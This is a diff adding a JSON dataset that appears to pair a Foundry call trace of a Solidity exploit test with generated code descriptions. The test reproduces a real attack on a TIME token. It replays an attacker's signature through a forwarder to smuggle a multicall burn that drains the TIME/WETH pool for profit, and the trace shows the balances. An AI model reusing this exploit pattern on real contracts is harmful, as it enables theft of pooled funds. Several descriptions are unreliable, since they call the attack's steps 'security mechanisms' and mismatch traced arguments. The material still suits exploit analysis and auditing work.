@@ -1,0 +1,359 @@
+[
+    {
+        "id": "368733",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        deal(address(this), 5 ether);\n        emit log_named_decimal_uint(\"Exploiter ETH balance before attack\", address(this).balance, 18);\n        TIME.approve(address(Router), type(uint256).max);\n        WETH.approve(address(Router), type(uint256).max);\n        WETH.deposit{value: 5 ether}();\n        WETHToTIME();\n\n        uint256 amountToBurn = 62_227_259_510 * 1e18;\n        bytes[] memory datas = new bytes[](1);\n        datas[0] = abi.encodePacked(TIME.burn.selector, amountToBurn, address(TIME_WETH));\n        bytes memory data = abi.encodeWithSelector(TIME.multicall.selector, datas);\n\n        IForwarder.ForwardRequest memory request =\n            IForwarder.ForwardRequest({from: recoverAddr, to: address(TIME), value: 0, gas: 5e6, nonce: 0, data: data});\n\n        // Using signature from attack tx\n        bytes32 messageHash = 0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6;\n        bytes32 r = 0x9194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f5;\n        bytes32 s = 0x11b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c6;\n        uint8 v = 27;\n        assertEq(ecrecover(messageHash, v, r, s), recoverAddr);\n        bytes memory signature = abi.encodePacked(r, s, v);\n\n        // Start exploit here\n        Forwarder.execute(request, signature);\n        // End exploit\n        TIME_WETH.sync();\n        TIMEToWETH();\n        WETH.withdraw(WETH.balanceOf(address(this)));\n\n        // In the end of attack tx also ~5 ether was transferred to Flashbot\n        emit log_named_decimal_uint(\"Exploiter ETH balance after attack\", address(this).balance, 18);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function simulates an attack scenario where it manipulates token balances and interactions between different contracts. It starts by funding the contract with 5 Ether, converts this Ether into WETH (Wrapped Ether), and then performs a series of operations involving token approvals, burning, and multicall transactions. The function also includes a signature verification step to ensure the authenticity of the transaction. Finally, it converts the tokens back into Ether and logs the balance before and after the attack.\n\n2. **Security mechanism**:  \n   - **`approve`**: Ensures that the Router contract has maximum allowance to spend TIME and WETH tokens.  \n   - **`ecrecover`**: Verifies the authenticity of the transaction by recovering the address from the provided signature.  \n   - **`assertEq`**: Checks that the recovered address matches the expected address, ensuring the signature is valid.  \n   - **`Forwarder.execute`**: Executes the transaction only if the signature is verified, adding a layer of security.  \n\n3. **Parameter Function**:  \n   - **`deal(address(this), 5 ether)`**: Funds the contract with 5 Ether for the attack simulation.  \n   - **`WETH.deposit{value: 5 ether}()`**: Converts the 5 Ether into WETH.  \n   - **`amountToBurn`**: Specifies the amount of TIME tokens to burn.  \n   - **`datas`**: Encodes the data for the multicall transaction, including the burn operation.  \n   - **`request`**: Defines the transaction request, including the target contract, gas limit, and data.  \n   - **`messageHash`, `r`, `s`, `v`**: Components of the signature used for verification.  \n\n4. **Return description**:  \n   The function does not return a value but logs the Ether balance of the contract before and after the attack. The balance is calculated by checking the contract's Ether holdings at the start and end of the function. The difference in these balances reflects the success or failure of the simulated attack.  \n\n**In summary**, the `testExploit` function simulates an attack by manipulating token balances and verifying transaction authenticity. It uses security mechanisms like signature verification and token approvals to ensure the attack is executed correctly. The function logs the Ether balance before and after the attack to demonstrate the outcome.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000 [5e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "29647",
+        "args": "Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `approve` function allows the caller (the owner of tokens) to authorize another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common function in token contracts to enable delegation of token spending permissions.\n\n2. **Security mechanism**:  \n   - The function uses the `external` modifier, meaning it can only be called from outside the contract, ensuring internal state changes are protected.  \n   - It relies on the `_approve` internal function, which typically includes checks to prevent unauthorized or invalid approvals.  \n   - The function returns `true` to confirm the approval was successful, providing a clear indication of the operation's outcome.\n\n3. **Parameter Function**:  \n   - `spender`: The address of the account that is being authorized to spend tokens.  \n   - `value`: The maximum amount of tokens the `spender` is allowed to transfer from the caller's account.  \n\n4. **Return description**:  \n   The function always returns `true` after successfully executing the `_approve` function, indicating that the approval operation was completed without errors.  \n\nIn summary, the `approve` function is a straightforward way for token owners to grant spending permissions to other addresses, with built-in security measures to ensure the process is safe and reliable.",
+        "return_value": "true"
+    },
+    {
+        "id": "26969",
+        "args": "Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24420",
+        "args": "Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "23974",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+        "description": "1. Core functions:  \nThe `balanceOf` function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides this information to the caller. This is a common function in token contracts to allow users or other contracts to query how many tokens a particular account holds.\n\n2. Security mechanism:  \nThe function includes the `view` modifier, which ensures that it does not modify the state of the contract (i.e., it only reads data). The `public` modifier makes it accessible to anyone, and the `virtual override` allows it to be overridden in derived contracts if needed. These modifiers ensure the function is safe to call without risking unintended changes to the contract.\n\n3. Parameter Function:  \nThe function takes one parameter, `account`, which is an address. This parameter specifies the account whose token balance is being queried. The function uses this address to look up the corresponding balance in the contract's storage.\n\n4. Return description:  \nThe function returns a `uint256` value, which represents the balance of the specified account. It retrieves this value directly from the `_balances` mapping, where the account address is used as the key to find the associated balance.\n\nIn summary, the `balanceOf` function is a simple and secure way to check the token balance of a specific account. It uses the provided account address to look up and return the balance stored in the contract, ensuring no state changes occur during the process.",
+        "return_value": "5000000000000000000 [5e18]"
+    },
+    {
+        "id": "94410",
+        "args": "5000000000000000000 [5e18], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701905307 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8225",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], 5000000000000000000 [5e18]",
+        "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `transferFrom` function is designed to move a specified amount of tokens from one address (`from`) to another address (`to`). It is typically used when a token owner allows a third party (like a smart contract or another user) to manage and transfer tokens on their behalf. This function ensures that the transfer is authorized by checking the allowance granted to the caller (`msg.sender`).\n\n2. **Security mechanism**:  \n   - The function includes a check to ensure the caller (`msg.sender`) has sufficient allowance to transfer the tokens. If the allowance is not set to the maximum value (`uint(-1)`), it reduces the allowance by the transferred amount.  \n   - The `sub` function (likely from a SafeMath library) is used to prevent underflow, ensuring the allowance does not go below zero.  \n   - The `_transfer` function (not shown here) is assumed to handle the actual transfer logic securely, including balance checks.  \n\n3. **Parameter Function**:  \n   - `from`: The address from which tokens are being transferred.  \n   - `to`: The address receiving the tokens.  \n   - `value`: The amount of tokens to be transferred.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the transfer was successful. This is a common practice in ERC-20 token standards to confirm the operation's completion.  \n\n**In summary**, the `transferFrom` function securely transfers tokens from one address to another, ensuring the caller has proper authorization and updating the allowance accordingly. It returns `true` to confirm the transfer's success.",
+        "return_value": "true"
+    },
+    {
+        "id": "2798",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2626",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "65692658856160314505008470321 [6.569e28], 89787809617954054780 [8.978e19], 1701389183 [1.701e9]"
+    },
+    {
+        "id": "534",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94787809617954054780 [9.478e19]"
+    },
+    {
+        "id": "69859",
+        "args": "3455399346269045701666911322 [3.455e27], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "37204",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3455399346269045701666911322 [3.455e27]",
+        "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**\n   - The `transfer` function allows a user to send a specific amount of tokens from their own address to another address. It directly calls the internal `_transfer` function to move the tokens.\n   - The `transferFrom` function enables a user to transfer tokens on behalf of another address, provided they have been granted permission (allowance) to do so. It checks and updates the allowance before calling the internal `_transfer` function.\n\n2. **Security mechanism:**\n   - Both functions use the `external` modifier, meaning they can only be called from outside the contract, ensuring internal logic is protected.\n   - The `transferFrom` function includes a check to ensure the caller has sufficient allowance to transfer the specified amount of tokens. If the allowance is not unlimited (represented by `uint(-1)`), it deducts the transferred amount from the allowance to prevent misuse.\n   - The `sub` function (likely from a safe math library) ensures that arithmetic operations do not result in underflows, adding an extra layer of security.\n\n3. **Parameter Function:**\n   - In the `transfer` function:\n     - `to`: The address receiving the tokens.\n     - `value`: The amount of tokens to be transferred.\n   - In the `transferFrom` function:\n     - `from`: The address from which tokens are being transferred.\n     - `to`: The address receiving the tokens.\n     - `value`: The amount of tokens to be transferred.\n\n4. **Return description:**\n   - Both functions return a boolean value `true` to indicate that the transfer was successful. This is a standard practice to confirm the operation's completion, though the actual transfer logic is handled by the internal `_transfer` function.\n\n**In summary,**\nThe `transfer` and `transferFrom` functions facilitate token transfers between addresses, with the latter requiring prior permission. Security measures include allowance checks and safe arithmetic operations, ensuring safe and controlled token movements. Both functions confirm success by returning `true`.",
+        "return_value": "true"
+    },
+    {
+        "id": "37026",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3455399346269045701666911322 [3.455e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "798",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "62237259509891268803341558999 [6.223e28]"
+    },
+    {
+        "id": "626",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "62237259509891268803341558999 [6.223e28]"
+    },
+    {
+        "id": "534",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94787809617954054780 [9.478e19]"
+    },
+    {
+        "id": "798",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3455399346269045701666911322 [3.455e27]"
+    },
+    {
+        "id": "626",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3455399346269045701666911322 [3.455e27]"
+    },
+    {
+        "id": "3000",
+        "args": "0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6, 27, 65847907045785360296324369037753572276712477681648530293081197803666264345077, 8014027068490085741275661760746077238879405461533119087921122232888442787014",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000a16a5f37774309710711a8b4e83b068306b21724"
+    },
+    {
+        "id": "0",
+        "args": "recoverAddr: [0xa16A5F37774309710711a8B4E83b068306b21724], recoverAddr: [0xa16A5F37774309710711a8B4E83b068306b21724]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "77668",
+        "args": "ForwardRequest({ from: 0xa16A5F37774309710711a8B4E83b068306b21724, to: 0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29, value: 0, gas: 5000000 [5e6], nonce: 0, data: 0xac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf840000000000000000 }",
+        "original_code": "    function execute(ForwardRequest calldata req, bytes calldata signature)\n        public\n        payable\n        returns (bool, bytes memory)\n    {\n        require(verify(req, signature), \"MinimalForwarder: signature does not match request\");\n        _nonces[req.from] = req.nonce + 1;\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory result) = req.to.call{ gas: req.gas, value: req.value }(\n            abi.encodePacked(req.data, req.from)\n        );\n\n        if (!success) {\n            // Next 5 lines from https://ethereum.stackexchange.com/a/83577\n            if (result.length < 68) revert(\"Transaction reverted silently\");\n            assembly {\n                result := add(result, 0x04)\n            }\n            revert(abi.decode(result, (string)));\n        }\n        // Check gas: https://ronan.eth.link/blog/ethereum-gas-dangers/\n        assert(gasleft() > req.gas / 63);\n        return (success, result);\n    }\n}\n",
+        "description": "1. Core functions:  \nThis function is designed to execute a transaction request on behalf of a user. It takes a request (`req`) and a signature (`signature`) as inputs. The function verifies the signature to ensure the request is legitimate, updates a nonce (a unique number to prevent replay attacks), and then sends the transaction to the specified address (`req.to`). It handles the transaction's success or failure and ensures that enough gas remains for the operation to complete safely.\n\n2. Security mechanism:  \n- **Signature Verification**: The function uses `verify(req, signature)` to ensure the request is signed by the correct user, preventing unauthorized transactions.  \n- **Nonce Management**: It increments the nonce (`_nonces[req.from]`) to prevent replay attacks, where the same request could be executed multiple times.  \n- **Gas Check**: The function asserts that sufficient gas remains (`gasleft() > req.gas / 63`) to avoid running out of gas during execution.  \n- **Error Handling**: If the transaction fails, it decodes and reverts with a meaningful error message to provide clarity on the failure reason.  \n\n3. Parameter Function:  \n- **`req`**: This is a structured request containing details like the sender (`from`), recipient (`to`), gas limit (`gas`), value (`value`), data (`data`), and nonce (`nonce`). It defines the transaction to be executed.  \n- **`signature`**: This is a cryptographic signature that proves the request was authorized by the sender. It ensures the request hasn\u2019t been tampered with.  \n\n4. Return description:  \nThe function returns two values:  \n- **`success`**: A boolean indicating whether the transaction was executed successfully (`true`) or failed (`false`).  \n- **`result`**: The data returned from the transaction. If the transaction fails, it contains an error message decoded from the revert reason.  \n\nIn summary, this function securely executes a transaction request by verifying the sender\u2019s signature, managing nonces to prevent replay attacks, and ensuring sufficient gas is available. It handles both successful and failed transactions, returning the outcome and any relevant data.",
+        "return_value": "true, 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "3000",
+        "args": "0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6, 27, 65847907045785360296324369037753572276712477681648530293081197803666264345077, 8014027068490085741275661760746077238879405461533119087921122232888442787014",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000a16a5f37774309710711a8b4e83b068306b21724"
+    },
+    {
+        "id": "46447",
+        "args": "[0x42966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf84]",
+        "original_code": "    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {\n        results = new bytes[](data.length);\n        for (uint256 i = 0; i < data.length; i++) {\n",
+        "description": "1. **Core functions:**\n   The `multicall` function is designed to handle multiple calls in a single transaction. It takes an array of encoded function calls (as `bytes`) and executes each one sequentially. This is useful for bundling multiple operations into a single transaction, reducing gas costs and improving efficiency.\n\n2. **Security mechanism:**\n   - The function is marked as `external`, meaning it can only be called from outside the contract, not internally.\n   - It is also marked as `virtual`, allowing it to be overridden by derived contracts if needed.\n   - The function does not include explicit access control modifiers (like `onlyOwner`), so it is publicly accessible. This could be a security consideration depending on the use case.\n\n3. **Parameter Function:**\n   - `data`: This is an array of `bytes` where each element represents an encoded function call. The function processes each element in the array to execute the corresponding call.\n\n4. **Return description:**\n   The function returns an array of `bytes` called `results`. For each function call in the `data` array, the result of that call is stored in the corresponding position in the `results` array. The length of `results` matches the length of `data`.\n\n**In summary,**\nThe `multicall` function efficiently processes multiple function calls in one transaction, returning the results of each call. It is publicly accessible and can be customized in derived contracts. The `data` parameter contains the encoded function calls, and the `results` array stores the outcomes of these calls.",
+        "return_value": "[0x]"
+    },
+    {
+        "id": "46236",
+        "args": "[0x42966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[0x]"
+    },
+    {
+        "id": "43617",
+        "args": "62227259510000000000000000000 [6.222e28]",
+        "original_code": "    function burn(address to) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   This function is designed to \"burn\" or remove liquidity from a pool. When liquidity is burned, the corresponding tokens are returned to the user in proportion to their share of the pool. The function calculates the amounts of two tokens (`amount0` and `amount1`) that should be returned to the user based on their liquidity share. It then transfers these tokens to the specified address (`to`) and updates the pool's reserves to reflect the reduced liquidity.\n\n2. **Security mechanism**:  \n   - The `lock` modifier ensures that the function cannot be re-entered while it is still executing, preventing potential attacks.  \n   - The `require` statement checks that the calculated amounts (`amount0` and `amount1`) are greater than zero, ensuring that the user has sufficient liquidity to burn.  \n   - The `_safeTransfer` function is used to securely transfer tokens, preventing failures or unexpected behavior during the transfer process.  \n   - The `_mintFee` function is called to handle any fees that might be applicable before burning liquidity.  \n\n3. **Parameter Function**:  \n   - `to`: This is the address where the tokens will be sent after burning the liquidity. It specifies the recipient of the tokens.  \n\n4. **Return description**:  \n   The function returns two values: `amount0` and `amount1`. These represent the amounts of the two tokens that are returned to the user when liquidity is burned. The calculation is based on the user's share of the total liquidity in the pool. Specifically, `amount0` is calculated as the user's liquidity multiplied by the balance of the first token, divided by the total supply of liquidity tokens. Similarly, `amount1` is calculated using the balance of the second token. This ensures a fair and proportional distribution of tokens to the user.  \n\nIn summary, this function allows users to remove liquidity from a pool, receive their share of the underlying tokens, and ensures the process is secure and proportional.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "43448",
+        "args": "62227259510000000000000000000 [6.222e28]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "7850",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "798",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9999999891268803341558999 [9.999e24]"
+    },
+    {
+        "id": "626",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9999999891268803341558999 [9.999e24]"
+    },
+    {
+        "id": "534",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94787809617954054780 [9.478e19]"
+    },
+    {
+        "id": "798",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3455399346269045701666911322 [3.455e27]"
+    },
+    {
+        "id": "626",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3455399346269045701666911322 [3.455e27]"
+    },
+    {
+        "id": "53045",
+        "args": "3455399346269045701666911322 [3.455e27], 0, [0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701905307 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6932",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], 3455399346269045701666911322 [3.455e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6748",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], 3455399346269045701666911322 [3.455e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "9999999891268803341558999 [9.999e24], 94787809617954054780 [9.478e19], 1701904307 [1.701e9]"
+    },
+    {
+        "id": "798",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3465399346160314505008470321 [3.465e27]"
+    },
+    {
+        "id": "626",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3465399346160314505008470321 [3.465e27]"
+    },
+    {
+        "id": "36601",
+        "args": "0, 94513462587046838316 [9.451e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 94513462587046838316 [9.451e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "798",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3465399346160314505008470321 [3.465e27]"
+    },
+    {
+        "id": "626",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3465399346160314505008470321 [3.465e27]"
+    },
+    {
+        "id": "534",
+        "args": "TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]",
+        "original_code": null,
+        "description": null,
+        "return_value": "274347030907216464 [2.743e17]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94513462587046838316 [9.451e19]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94513462587046838316 [9.451e19]"
+    },
+    {
+        "id": "9195",
+        "args": "94513462587046838316 [9.451e19]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
